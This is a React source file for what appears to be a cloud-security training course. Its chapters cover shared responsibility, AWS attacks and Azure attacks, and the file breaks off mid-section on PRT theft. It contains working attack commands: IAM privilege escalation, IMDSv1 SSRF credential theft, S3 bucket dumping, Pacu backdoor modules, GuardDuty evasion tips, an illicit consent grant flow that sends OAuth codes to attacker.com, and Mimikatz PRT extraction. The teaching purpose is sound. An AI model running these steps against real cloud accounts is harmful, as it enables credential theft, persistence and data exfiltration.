'use client'
import React from 'react'
import Link from 'next/link'
import ModuleCodex, { CodexChapter } from '../../components/ModuleCodex'

const accent = '#ff9500'
const mono = 'JetBrains Mono, monospace'

const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: mono, fontSize: '9px', color: '#6a4a2a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#080600', border: '1px solid #3a2800', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: mono, fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const H3 = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontFamily: mono, fontSize: '0.85rem', fontWeight: 600, color: '#cc7800', marginTop: '1.75rem', marginBottom: '0.6rem' }}>&#9658; {children}</h3>
)
const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ color: '#9a8a7a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.88rem' }}>{children}</p>
)
const Note = ({ type = 'info', children }: { type?: 'info' | 'warn' | 'danger' | 'tip'; children: React.ReactNode }) => {
  const cfg: Record<string, [string, string]> = {
    info:   ['#ff9500', 'NOTE'],
    warn:   ['#ffb347', 'WARNING'],
    danger: ['#ff4136', 'CRITICAL'],
    tip:    ['#00ff41', 'PRO TIP'],
  }
  const [c, lbl] = cfg[type]
  return (
    <div style={{ background: c + '08', border: '1px solid ' + c + '33', borderLeft: '3px solid ' + c, borderRadius: '0 4px 4px 0', padding: '1rem 1.25rem', margin: '1.25rem 0' }}>
      <div style={{ fontFamily: mono, fontSize: '9px', color: c, letterSpacing: '0.2em', marginBottom: '6px' }}>{lbl}</div>
      <div style={{ color: '#8a9a9a', fontSize: '0.83rem', lineHeight: 1.7 }}>{children}</div>
    </div>
  )
}
const Table = ({ headers, rows }: { headers: string[]; rows: string[][] }) => (
  <div style={{ overflowX: 'auto', margin: '1rem 0 1.5rem' }}>
    <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: mono, fontSize: '0.75rem' }}>
      <thead>
        <tr style={{ borderBottom: '1px solid #3a2800' }}>
          {headers.map((h, i) => <th key={i} style={{ textAlign: 'left', padding: '8px 12px', color: accent, fontWeight: 600, letterSpacing: '0.1em', fontSize: '0.7rem' }}>{h}</th>)}
        </tr>
      </thead>
      <tbody>
        {rows.map((row, i) => (
          <tr key={i} style={{ borderBottom: '1px solid #1a1000', background: i % 2 === 0 ? 'transparent' : 'rgba(255,149,0,0.015)' }}>
            {row.map((cell, j) => <td key={j} style={{ padding: '8px 12px', color: '#8a8a7a', verticalAlign: 'top' }}>{cell}</td>)}
          </tr>
        ))}
      </tbody>
    </table>
  </div>
)

const chapters: CodexChapter[] = [
  {
    id: 'cs-01',
    title: 'Cloud Security Fundamentals',
    difficulty: 'BEGINNER',
    readTime: '12 min',
    labLink: '/modules/cloud-security/lab',
    takeaways: [
      'In IaaS the customer owns OS and above; in SaaS the provider owns almost everything - shared responsibility shifts dramatically across models',
      'Identity IS the perimeter in cloud - there is no network boundary the way there is on-prem; compromised credentials = game over',
      'Misconfiguration is the #1 cloud breach cause - public S3 buckets, open security groups, and overprivileged IAM roles are constant targets',
      'CSPM tools like Wiz and Prisma Cloud continuously audit your cloud posture against CIS benchmarks and flag drift in real time',
      'Multi-cloud environments compound risk: each platform has its own IAM model, logging gaps, and attack surface to master',
    ],
    content: (
      <div>
        <P>Cloud computing has fundamentally changed the security landscape. On-premises networks had a clear perimeter: if you controlled the firewall, you controlled access. Cloud eliminates that perimeter entirely. Data and compute live in shared infrastructure operated by a third party, accessible from anywhere with the right credentials. This makes cloud security both more scalable and more treacherous.</P>
        <Note type="info">Think of cloud security like renting an apartment vs. owning a house. When you own, you control everything - the locks, the wiring, the roof. When you rent, you and the landlord share responsibilities. The lease (shared responsibility model) defines exactly who fixes what. Security breaches happen when tenants assume the landlord handles something they actually own themselves.</Note>

        <H3>Cloud Service Models and Shared Responsibility</H3>
        <P>The shared responsibility model defines which security controls the cloud provider handles and which the customer must implement. This boundary shifts depending on which service model you use.</P>
        <Table
          headers={['Layer', 'IaaS Example', 'PaaS Example', 'SaaS Example', 'FaaS Example']}
          rows={[
            ['Physical / Datacentre', 'Provider', 'Provider', 'Provider', 'Provider'],
            ['Network infrastructure', 'Provider', 'Provider', 'Provider', 'Provider'],
            ['Hypervisor / Host OS', 'Provider', 'Provider', 'Provider', 'Provider'],
            ['Guest OS / Runtime', 'Customer', 'Provider', 'Provider', 'Provider'],
            ['Middleware / Platform', 'Customer', 'Provider', 'Provider', 'Provider'],
            ['Application code', 'Customer', 'Customer', 'Provider', 'Customer'],
            ['Data classification', 'Customer', 'Customer', 'Customer', 'Customer'],
            ['Identity and access', 'Customer', 'Customer', 'Shared', 'Customer'],
            ['Network controls', 'Customer', 'Shared', 'Provider', 'Provider'],
          ]}
        />
        <Pre label="// CLOUD SERVICE MODELS AT A GLANCE">{`# IaaS — Infrastructure as a Service
# AWS EC2, Azure VMs, GCP Compute Engine
# You get: virtual machines, storage, networking
# You manage: OS patches, runtime, middleware, app code, IAM
# Attack surface: everything above the hypervisor is YOUR problem

# PaaS — Platform as a Service
# AWS Elastic Beanstalk, Azure App Service, GCP App Engine, Heroku
# You get: managed runtime + platform, deploy code directly
# You manage: application code, data, some network config
# Attack surface: code injection, dependency vulns, misconfigured env vars

# SaaS — Software as a Service
# Google Workspace, Microsoft 365, Salesforce, Slack
# You get: finished application, no infra to manage
# You manage: user accounts, permissions, data you put in
# Attack surface: identity (OAuth, SSO), data classification, integrations

# FaaS / Serverless — Function as a Service
# AWS Lambda, Azure Functions, GCP Cloud Functions
# You get: ephemeral compute triggered by events
# You manage: function code, IAM roles, environment variables
# Attack surface: event injection, dependency confusion, env var secrets, IAM roles`}</Pre>

        <H3>Major Cloud Providers - Security Feature Comparison</H3>
        <P>AWS holds roughly 31% market share and is the most common target in bug bounties and red team engagements. Azure holds around 25% and dominates enterprise environments deeply tied to Active Directory. GCP holds around 11% and is favoured by data-intensive and developer-heavy organisations.</P>
        <Table
          headers={['Feature', 'AWS', 'Azure', 'GCP']}
          rows={[
            ['IAM Service', 'IAM (users/roles/policies)', 'Azure AD + RBAC', 'Cloud IAM + Service Accounts'],
            ['Audit Logging', 'CloudTrail', 'Azure Monitor / Activity Log', 'Cloud Audit Logs'],
            ['Threat Detection', 'GuardDuty', 'Microsoft Defender for Cloud', 'Security Command Center'],
            ['Secret Management', 'Secrets Manager / SSM', 'Key Vault', 'Secret Manager'],
            ['SIEM', 'Security Hub + partner', 'Microsoft Sentinel', 'Chronicle / partner'],
            ['Vulnerability Mgmt', 'Inspector', 'Defender for Servers', 'Security Command Center'],
            ['Config Compliance', 'AWS Config', 'Azure Policy', 'Security Health Analytics'],
            ['Network Firewall', 'Security Groups + NACLs', 'NSGs + Azure Firewall', 'VPC Firewall Rules + Cloud Armor'],
          ]}
        />

        <H3>Cloud Threat Model</H3>
        <P>The cloud threat model differs significantly from on-premises. Physical attacks are largely irrelevant - you cannot walk up to an AWS rack. Instead, the threats concentrate around identity, configuration, and software supply chain.</P>
        <Pre label="// PRIMARY CLOUD THREAT CATEGORIES">{`# 1. MISCONFIGURATION (most common breach cause)
# Public S3 buckets, open RDS instances, permissive security groups
# Overprivileged IAM roles, public ECR images, open Redis/Elasticsearch
# Misconfigured Kubernetes RBAC, public etcd, unauthenticated kubelet

# 2. COMPROMISED CREDENTIALS
# Access keys hardcoded in GitHub repos (truffleHog, git-secrets detect these)
# Keys exposed via Lambda env vars, EC2 userdata, container image layers
# Phishing for AWS console credentials / Azure AD passwords
# SSRF attacks reaching IMDS (Instance Metadata Service) to steal temp creds

# 3. INSIDER THREAT
# Employee with broad IAM access - exfiltrates data before leaving
# Accidental public share of S3 bucket by developer
# Shadow IT: teams spinning up unmanaged cloud accounts

# 4. SUPPLY CHAIN
# Malicious packages in Lambda layers or container images
# Typosquatting in PyPI/npm that exfiltrate cloud credentials
# Compromised Terraform module or CDK construct in CI/CD pipeline
# Third-party SaaS integration with overpermissioned OAuth scope`}</Pre>

        <H3>Cloud Attack Lifecycle</H3>
        <P>The cloud attack lifecycle maps closely to MITRE ATT&CK for Cloud. Understanding the phases helps you know where to focus detective controls and where attackers are likely to dwell longest.</P>
        <Pre label="// CLOUD ATTACK KILL CHAIN">{`# PHASE 1: RECONNAISSANCE
# Enumerate public S3 buckets (GrayhatWarfare, S3Scanner)
# Find exposed cloud credentials in GitHub (truffleHog, GitLeaks)
# Identify cloud provider via ASN, CNAME, response headers
# Shodan/Censys for open cloud ports (Redis 6379, etcd 2379, kubelet 10250)

# PHASE 2: INITIAL ACCESS
# Use exposed access key to call AWS STS GetCallerIdentity
# Exploit SSRF in web app to reach IMDS (169.254.169.254)
# Credential stuffing against Azure AD / AWS console login
# Illicit consent grant attack on Azure AD OAuth app

# PHASE 3: EXECUTION
# Invoke Lambda functions with malicious event payloads
# Run commands via SSM Session Manager (no SSH needed)
# Execute via EC2 userdata on new instances
# Kubernetes: kubectl exec into compromised pod

# PHASE 4: PERSISTENCE
# Create backdoor IAM user with access key
# Add attacker-controlled MFA device to existing user
# Register rogue OAuth application in Azure AD tenant
# Create new service account key in GCP project
# Install Lambda layer that persists across deployments

# PHASE 5: LATERAL MOVEMENT
# Assume cross-account IAM roles
# Hop through EC2 instance profiles to reach more-privileged roles
# Impersonate GCP service accounts across projects
# Use managed identity SSRF to access other Azure resources

# PHASE 6: PRIVILEGE ESCALATION
# iam:CreatePolicyVersion -> attach admin policy to self
# iam:PassRole + ec2:RunInstances -> run instance with admin role
# Azure: add self to Global Admin via Privileged Role Admin
# GCP: iam.serviceAccounts.actAs to impersonate high-priv SA

# PHASE 7: EXFILTRATION
# S3 sync to attacker-controlled bucket in different account
# RDS snapshot share to external account
# Exfil via DNS (slow but evades many DLP tools)
# CloudFront/S3 as staging point before final exfil`}</Pre>

        <H3>Cloud Security Frameworks and Compliance</H3>
        <P>Several frameworks exist to help organisations structure their cloud security programs. The CSA Cloud Controls Matrix is the most comprehensive cloud-specific framework, covering 197 control objectives across 17 domains including identity, encryption, and incident response.</P>
        <Table
          headers={['Framework', 'Focus', 'Use Case']}
          rows={[
            ['CSA CCM v4', 'Cloud-specific controls across 17 domains', 'Security architecture baseline'],
            ['CIS AWS Benchmark', 'AWS-specific hardening (IAM, logging, networking)', 'AWS configuration audit'],
            ['CIS Azure Benchmark', 'Azure AD, Storage, Networking hardening', 'Azure configuration audit'],
            ['CIS GCP Benchmark', 'GCP IAM, logging, compute hardening', 'GCP configuration audit'],
            ['NIST CSF', 'Identify/Protect/Detect/Respond/Recover', 'Risk management program'],
            ['SOC 2 Type II', 'Trust Service Criteria - availability, confidentiality', 'SaaS vendor assessment'],
            ['ISO 27001', 'Information security management system', 'Enterprise certification'],
            ['PCI DSS', 'Payment card data in cloud environments', 'E-commerce/fintech compliance'],
          ]}
        />

        <H3>CIEM and CSPM Tools</H3>
        <P>Cloud Infrastructure Entitlement Management (CIEM) focuses specifically on who (or what) can access what in your cloud environment. Traditional IAM tools show you what permissions exist; CIEM shows you what permissions are actually being USED versus what was granted - revealing the massive privilege creep that accumulates over time. Cloud Security Posture Management (CSPM) continuously scans cloud configuration against policy baselines.</P>
        <Pre label="// CSPM AND CIEM TOOL COMPARISON">{`# Wiz
# Agentless, graph-based risk analysis
# Maps attack paths: "internet-exposed EC2 with admin role = critical"
# CIEM module shows effective permissions vs granted permissions
# Most popular enterprise CSPM as of 2024

# Prisma Cloud (Palo Alto Networks)
# Comprehensive CNAPP: CSPM + CWPP + CIEM + IaC scanning
# Deep AWS/Azure/GCP integration with compliance reporting

# Orca Security
# Agentless side-scanning via cloud provider API (no agents needed)
# Reads memory, disk of cloud workloads without touching them
# Strong container and serverless coverage

# Aqua Security
# Container and serverless focused CWPP
# Runtime protection, DTA (Dynamic Threat Analysis) for images
# Strong Kubernetes security posture management

# Open Source Alternatives:
# ScoutSuite     - multi-cloud audit (AWS/Azure/GCP) Python CLI
# Prowler        - AWS/Azure/GCP CIS benchmark checks, 200+ checks
# CloudMapper    - AWS network visualization and attack surface review
# Steampipe      - SQL queries against cloud APIs for custom auditing`}</Pre>
      </div>
    ),
  },

  {
    id: 'cs-02',
    title: 'AWS Security and Attacks',
    difficulty: 'INTERMEDIATE',
    readTime: '18 min',
    labLink: '/modules/cloud-security/lab',
    takeaways: [
      'IAM policy evaluation always follows: explicit deny wins > explicit allow > implicit deny (default deny everything)',
      'IMDSv1 is the most dangerous AWS feature ever shipped - any SSRF vulnerability in an EC2-hosted app can steal temporary credentials; IMDSv2 mitigates this',
      'Pacu and cloudfox automate most AWS enumeration and privilege escalation path discovery - learn their module structure',
      'S3 bucket misconfigurations remain a top breach vector - public bucket policies, misconfigured ACLs, and presigned URL abuse are all distinct attack surfaces',
      'CloudTrail does not log everything by default - data events (S3 object reads, Lambda invocations) require explicit enablement and cost extra',
    ],
    content: (
      <div>
        <P>AWS is the most commonly encountered cloud platform in security assessments. Its IAM system is powerful but complex - a complexity that regularly creates exploitable privilege escalation paths. Understanding how AWS credentials work, how IAM policies are evaluated, and where credentials leak is foundational to cloud offensive security.</P>

        <H3>IAM Fundamentals</H3>
        <P>AWS Identity and Access Management (IAM) controls who can do what to which AWS resource. It has several principal types: Users (humans with long-term credentials), Groups (collections of users sharing policies), Roles (assumed by services/code, temporary credentials), and Service Accounts used via instance profiles.</P>
        <Pre label="// IAM POLICY STRUCTURE">{`{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:PutObject"
      ],
      "Resource": "arn:aws:s3:::BUCKET_NAME/*",
      "Condition": {
        "StringEquals": {
          "aws:RequestedRegion": "us-east-1"
        }
      }
    }
  ]
}

# Policy types:
# AWS Managed   - created by AWS, use as starting point
# Customer Managed - you create and control
# Inline        - embedded directly in IAM entity, not reusable
# Permission Boundary - maximum permissions an entity can ever have
# SCP (Service Control Policy) - org-level deny ceiling, cannot be overridden
# Resource Policy - attached to resource (S3 bucket policy, KMS key policy)`}</Pre>

        <H3>IAM Policy Evaluation Logic</H3>
        <Pre label="// AWS POLICY EVALUATION ORDER (memorise this)">{`# Step 1: Explicit DENY wins always - no exceptions
# If any policy says Deny, the action is denied regardless of Allow statements
# Even if you have 10 Allow statements, one Deny beats all of them

# Step 2: Check SCPs (Service Control Policies from AWS Organizations)
# If SCP doesn't allow it, action denied even if IAM allows it

# Step 3: Check Resource-based policies
# S3 bucket policy, KMS key policy, etc.

# Step 4: Check Permission Boundaries
# If boundary doesn't include the action, denied

# Step 5: Check Identity-based policies
# User/Group/Role policies - must have explicit Allow

# Step 6: No explicit Allow found = IMPLICIT DENY (default)
# AWS denies everything by default unless explicitly allowed

# KEY ATTACK INSIGHT:
# If you find a role with NO permission boundary, it can potentially
# escalate to any permission that its attached policies allow`}</Pre>

        <H3>Dangerous IAM Permissions - Privilege Escalation Paths</H3>
        <Pre label="// HIGH-VALUE IAM PERMISSIONS FOR ATTACKERS">{`# iam:CreateAccessKey
# Create new access key for ANY IAM user including admins
# aws iam create-access-key --user-name admin-user

# iam:AttachUserPolicy / iam:AttachRolePolicy
# Attach the AdministratorAccess managed policy to yourself
# aws iam attach-user-policy --user-name ATTACKER_USER \
#   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# iam:PutUserPolicy / iam:PutRolePolicy (inline policy)
# Write arbitrary inline policy granting admin
# More stealthy than attaching managed policies

# iam:CreatePolicyVersion
# If you can create new versions of existing policies, add admin permissions
# and set as default version - the policy now grants admin to all its users

# iam:PassRole + ec2:RunInstances
# Launch an EC2 instance with an admin IAM role attached
# Your code on that instance inherits the role via IMDS

# iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
# Create Lambda with admin role, invoke it to exfil creds or create backdoor

# sts:AssumeRole
# Assume a role in another account or a more-privileged role
# Cross-account attacks use this to pivot

# cloudformation:CreateStack + iam:PassRole
# CloudFormation can create/modify IAM resources if you pass it an admin role`}</Pre>

        <H3>AWS Credentials - Types and Exposure</H3>
        <Pre label="// CREDENTIAL TYPES AND LOCATIONS">{`# Long-term access keys (IAM Users)
# Stored in ~/.aws/credentials
# Format: AKIA... (access key) + 40-char secret key
# Persist until manually rotated/deleted - highest risk if leaked

# Temporary credentials (STS - Security Token Service)
# Issued when assuming a role or using instance profiles
# Format: ASIA... (access key) + secret + session token
# Expire automatically (15min - 36hr depending on role config)

# Instance Profile (EC2)
# Role attached to EC2 instance - no keys stored on disk
# Retrieved from IMDS: http://169.254.169.254/latest/meta-data/
# Rotate automatically every ~6hr

# IRSA - IAM Roles for Service Accounts (EKS)
# Kubernetes pods get AWS permissions via projected service account tokens
# Bound to Kubernetes SA, fetched via OIDC federation

# Common credential exposure vectors:
# git push with .aws/credentials or hardcoded keys in code
# Lambda environment variables (visible in AWS console to anyone with lambda:GetFunction)
# EC2 userdata (retrieved via IMDS - anyone on the instance can read it)
# CloudFormation template parameters without NoEcho
# S3 objects with public access containing .env files or config files
# Container image layers (docker history reveals ENV vars)
# CI/CD pipeline logs printing environment variables`}</Pre>

        <H3>AWS CLI Enumeration</H3>
        <Pre label="// INITIAL ENUMERATION WITH FOUND CREDENTIALS">{`# First: Who am I?
aws sts get-caller-identity
# Returns: Account ID, User/Role ARN, User ID

# Configure a profile with found creds
aws configure --profile TARGET
# Enter access key, secret key, region

# Or set environment variables
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=AQoXnyc...   # only for temp creds

# Enumerate IAM permissions without triggering GuardDuty findings:
# Use enumerate-iam (https://github.com/andresriancho/enumerate-iam)
python3 enumerate-iam.py --access-key AKIA... --secret-key ...
# Brute-forces all IAM permissions - slow but comprehensive

# Key enumeration commands:
aws iam get-user
aws iam list-attached-user-policies --user-name USERNAME
aws iam list-user-policies --user-name USERNAME
aws iam list-groups-for-user --user-name USERNAME
aws iam get-account-summary
aws iam list-roles
aws iam list-users

# Check what you can do with S3:
aws s3 ls
aws s3 ls s3://BUCKET_NAME/

# EC2 enumeration:
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,Tags]'
aws ec2 describe-security-groups
aws ec2 describe-iam-instance-profile-associations`}</Pre>

        <H3>Pacu - AWS Exploitation Framework</H3>
        <P>Pacu is the AWS exploitation framework built by Rhino Security Labs. It has modules for every phase of an AWS attack and maintains a session state so you can resume work across multiple sessions.</P>
        <Pre label="// PACU KEY MODULES">{`# Install and start Pacu
git clone https://github.com/RhinoSecurityLabs/pacu
pip3 install -r requirements.txt
python3 pacu.py

# Set credentials in Pacu
Pacu> set_keys
# Enter access key, secret key, session token (if temp creds)

# Who am I?
Pacu> run iam__detect_honeytokens    # check if creds are canary tokens
Pacu> run iam__get_credential_report

# Enumerate all IAM permissions
Pacu> run iam__enum_users_roles_policies_groups

# Privilege escalation - finds all possible escalation paths
Pacu> run iam__privesc_scan
# Checks 20+ escalation methods, shows which ones your creds can use

# S3 attacks
Pacu> run s3__bucket_finder
Pacu> run s3__download_bucket

# EC2
Pacu> run ec2__enum
Pacu> run ec2__startup_commands    # check userdata for secrets

# Lambda
Pacu> run lambda__enum
Pacu> run lambda__backdoor_new_users

# Persistence
Pacu> run iam__backdoor_users_keys    # create access keys for all users
Pacu> run iam__backdoor_users_password

# CloudTrail evasion
Pacu> run cloudtrail__download_event_history`}</Pre>

        <H3>IMDSv1 SSRF - Stealing EC2 Credentials</H3>
        <P>The Instance Metadata Service (IMDS) is available on every EC2 instance at a link-local address. IMDSv1 allows any HTTP request from the instance to retrieve credentials - meaning if you can perform SSRF on an EC2-hosted application, you can steal AWS credentials.</P>
        <Pre label="// IMDSv1 EXPLOITATION VIA SSRF">{`# IMDS endpoint (only accessible from within the EC2 instance)
http://169.254.169.254/latest/meta-data/

# Step 1: Find the IAM role name attached to the instance
# Via SSRF: GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Response: ROLE_NAME

# Step 2: Get temporary credentials for that role
# Via SSRF: GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Response JSON:
{
  "AccessKeyId": "ASIAX...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-01-01T12:00:00Z"
}

# Step 3: Use credentials from your attacker machine
export AWS_ACCESS_KEY_ID=ASIAX...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity   # confirm you have the instance role

# Other useful IMDS paths:
# /latest/meta-data/hostname
# /latest/meta-data/public-ipv4
# /latest/meta-data/local-ipv4
# /latest/user-data   <-- often contains secrets, init scripts
# /latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance

# IMDSv2 defense:
# Requires PUT request first to get a session token (hop limit = 1)
# Hop limit of 1 means the token cannot be forwarded by SSRF
# SSRF cannot follow the two-step process - protection works
# Enforce IMDSv2-only via: HttpTokens=required in instance metadata options`}</Pre>

        <H3>S3 Attack Surface</H3>
        <Pre label="// S3 BUCKET DISCOVERY AND EXPLOITATION">{`# Find public buckets (passive recon)
# GrayhatWarfare: https://buckets.grayhatwarfare.com
# Search by company name to find exposed buckets

# S3Scanner - enumerate bucket permissions
pip install s3scanner
s3scanner scan --bucket BUCKET_NAME
s3scanner scan --bucket-file company-buckets.txt

# AWSBucketDump - download and search for sensitive files
python3 AWSBucketDump.py -b BUCKET_NAME -g interesting_keywords.txt

# Check bucket policy (without authentication)
aws s3api get-bucket-policy --bucket BUCKET_NAME --no-sign-request

# Check ACL
aws s3api get-bucket-acl --bucket BUCKET_NAME --no-sign-request

# List bucket contents (if public)
aws s3 ls s3://BUCKET_NAME/ --no-sign-request

# Download all files
aws s3 sync s3://BUCKET_NAME/ ./loot/ --no-sign-request

# Presigned URL abuse:
# Presigned URLs grant temporary access to S3 objects without AWS creds
# If a presigned URL is shared externally, the URL itself is the secret
# Presigned URLs can be generated with expiry up to 7 days
# Abuse: if you have s3:GetObject you can generate presigned URLs
#        for sensitive objects and share externally

# S3 replication attack:
# If cross-account replication is configured, data goes to another account
# An attacker who compromises the destination account gets all replicated data`}</Pre>

        <H3>CloudTrail Gaps and GuardDuty Evasion</H3>
        <Pre label="// CLOUDTRAIL LOGGING GAPS">{`# What CloudTrail logs by DEFAULT:
# Management events: CreateUser, AttachPolicy, RunInstances, etc.
# Console logins: ConsoleLogin events
# API calls with source IP, user agent, timestamp

# What CloudTrail does NOT log by default (requires extra config + cost):
# Data events: S3 GetObject/PutObject (reading/writing files)
# Lambda invocation events
# DynamoDB GetItem/PutItem operations
# Cognito user pool events

# Key CloudTrail events to monitor:
# ConsoleLogin         - failed logins from new IPs
# CreateUser           - new IAM user creation
# CreateAccessKey      - new programmatic access
# AttachUserPolicy     - policy attachment (possible escalation)
# PutBucketAcl         - making S3 bucket public
# GetSecretValue       - reading secrets from Secrets Manager
# AssumeRole           - role assumption (watch for cross-account)
# StopLogging          - disabling CloudTrail (instant critical alert)

# GuardDuty detection evasion techniques:
# Use the same region as the victim (GuardDuty is region-specific)
# Avoid known-bad IPs (Tor exit nodes trigger GuardDuty findings)
# Use legitimate AWS CLI rather than custom tooling (reduces anomaly score)
# Operate slowly - GuardDuty thresholds trigger on volume
# Use the victim organization's own VPC endpoints to blend in`}</Pre>
      </div>
    ),
  },

  {
    id: 'cs-03',
    title: 'Azure Security and Attacks',
    difficulty: 'INTERMEDIATE',
    readTime: '16 min',
    labLink: '/modules/cloud-security/lab',
    takeaways: [
      'Azure AD (Entra ID) is the identity backbone of the entire Microsoft ecosystem - compromise it and you own Office 365, Teams, SharePoint, and Azure resources simultaneously',
      'AzureHound + BloodHound reveals attack paths from low-priv user to Global Admin that would take days to find manually',
      'The illicit consent grant attack requires no credentials - just trick a user into clicking a link and your rogue app gets persistent API access to their mailbox',
      'PRT (Primary Refresh Token) is the most powerful credential in a hybrid Azure AD environment - it provides SSO to all Microsoft services without triggering MFA',
      'Managed Identity removes credential management entirely but creates a new SSRF attack surface - reach the Azure IMDS and you get a token for any Azure service the identity has access to',
    ],
    content: (
      <div>
        <P>Azure security is inseparable from Azure Active Directory (now called Microsoft Entra ID). Unlike AWS where IAM is a separate service, Azure AD IS the identity platform for the entire Microsoft cloud ecosystem. Attacking Azure often means attacking AD - a familiar territory for operators with Active Directory experience, but with new cloud-specific twists.</P>

        <H3>Azure AD Hierarchy</H3>
        <Pre label="// AZURE STRUCTURE">{`# TENANT
# A dedicated Azure AD instance (one per organisation)
# Contains all users, groups, apps, and service principals
# Identified by a Tenant ID (GUID) and domain (company.onmicrosoft.com)

# MANAGEMENT GROUPS
# Hierarchical containers for subscriptions
# Apply policy (Azure Policy) and RBAC across multiple subscriptions

# SUBSCRIPTIONS
# Billing boundary and resource container
# An organisation may have dozens of subscriptions (dev/prod/teams)
# Each subscription has an Azure AD tenant backing it

# RESOURCE GROUPS
# Logical containers for Azure resources within a subscription
# RBAC applied at resource group level inherits down to resources

# RESOURCES
# Actual services: VMs, storage accounts, databases, functions, etc.

# RBAC roles applied at any level inherit downward:
# Management Group -> Subscription -> Resource Group -> Resource
# Attacker with Owner on a Resource Group owns all resources in it`}</Pre>

        <H3>Azure AD Roles and RBAC Privilege Escalation</H3>
        <Table
          headers={['Role', 'Scope', 'Attack Value']}
          rows={[
            ['Global Administrator', 'Tenant', 'Full control over all Azure AD and can elevate to Owner on all subscriptions'],
            ['Privileged Role Administrator', 'Tenant', 'Can assign any role including Global Admin - effectively Global Admin'],
            ['Application Administrator', 'Tenant', 'Can add credentials to any app registration - token theft via service principal'],
            ['Cloud App Administrator', 'Tenant', 'Same as App Admin except cannot manage App Proxy'],
            ['User Access Administrator', 'Azure Resources', 'Can grant any RBAC role on any resource - path to Owner'],
            ['Owner', 'Subscription/RG', 'Full control of Azure resources in scope including RBAC'],
            ['Contributor', 'Subscription/RG', 'Manage resources but cannot change RBAC - still very powerful'],
          ]}
        />

        <H3>Azure AD Enumeration Tools</H3>
        <Pre label="// ENUMERATION WITH AZUREHOUND AND ROADTOOLS">{`# AzureHound - collect Azure AD data for BloodHound
# https://github.com/BloodHoundAD/AzureHound
./azurehound -u USER@company.com -p PASSWORD list --tenant TENANT_ID -o azurehound-output.json

# Or with refresh token:
./azurehound -r REFRESH_TOKEN list --tenant TENANT_ID -o output.json

# Import into BloodHound:
# Upload the JSON to BloodHound (works with legacy or CE edition)
# Run pre-built Azure attack path queries:
# "Shortest path from owned user to Global Admin"
# "All users with path to tier-zero assets"

# ROADtools - Azure AD exploration framework
pip3 install roadtools
# Authenticate:
roadrecon auth --username USER@company.com --password PASSWORD
# Or device code flow:
roadrecon auth --device-code

# Gather all Azure AD data:
roadrecon gather
# Creates a SQLite database with all users, groups, apps, service principals

# Query with roadrecon GUI:
roadrecon gui   # starts web UI at http://localhost:5000

# Azure CLI enumeration:
az login
az account list                              # list subscriptions
az ad user list --output table               # all users
az ad group list --output table             # all groups
az ad sp list --output table                # service principals
az role assignment list --all               # all RBAC assignments
az keyvault list                            # key vaults
az storage account list                     # storage accounts`}</Pre>

        <H3>Illicit Consent Grant Attack</H3>
        <P>This is one of the most elegant Azure attacks - it requires no credentials and no malware. You register a malicious OAuth application, craft a link that requests permissions to the victim's mailbox/files, and when they click it and consent, your app gets a persistent OAuth token with read access to their data.</P>
        <Pre label="// ILLICIT CONSENT GRANT - HOW IT WORKS">{`# Step 1: Register a rogue Azure AD application
# Go to: portal.azure.com -> Azure AD -> App Registrations -> New Registration
# Name it something convincing: "IT Security Scanner" or "O365 Backup Tool"
# Set redirect URI to your server: https://attacker.com/callback

# Step 2: Request high-value permissions
# API permissions requested in the consent URL:
# Mail.Read         - read all emails
# Files.Read.All    - read all OneDrive/SharePoint files
# Contacts.Read     - read address book
# offline_access    - get refresh tokens (persistent access)

# Step 3: Craft consent URL and send to target
# https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/authorize?
#   client_id=YOUR_APP_CLIENT_ID
#   &response_type=code
#   &redirect_uri=https://attacker.com/callback
#   &scope=Mail.Read Files.Read.All offline_access
#   &state=12345

# Step 4: Victim clicks, sees Microsoft consent prompt, clicks Accept
# Microsoft sends authorization code to your callback URL
# Exchange code for refresh_token:
curl -X POST https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/token \
  -d "client_id=YOUR_APP_ID&grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://attacker.com/callback"

# Step 5: Use refresh token indefinitely until admin revokes consent
# Read emails: GET https://graph.microsoft.com/v1.0/me/messages
# Read files: GET https://graph.microsoft.com/v1.0/me/drive/root/children`}</Pre>

        <H3>PRT Theft and Pass-the-PRT</H3>
        <P>The Primary Refresh Token (PRT) is the holy grail of Azure AD credential theft on hybrid-joined machines. It is issued to Windows devices that are Azure AD joined or hybrid-joined. It enables seamless SSO to all Microsoft services - including bypassing conditional access policies that require MFA - because the PRT itself is tied to a registered device and proves device compliance.</P>
        <Pre label="// PRT EXTRACTION AND ABUSE">{`# What is a PRT?
# A long-lived token (14 days, auto-renewed) stored in the LSA process
# Proves: this is a trusted device + this is a legitimate user
# Used by Windows to get access tokens for all Microsoft services silently
# Critically: satisfies MFA conditions even if user has MFA enforced

# Extracting PRTs with ROADtoken (run as SYSTEM or via process injection):
# https://github.com/dirkjanm/ROADtoken
.\ROADtoken.exe

# Or via Mimikatz:
# sekurlsa::cloudap   (dumps cloud credentials from LSA)
# Extracts PRT, ProofOfPossessionKey (PoP key), and session key

# Using the PRT for access with AADInternals:
Install-Module AADInternals
# Create a cookie from the PRT:
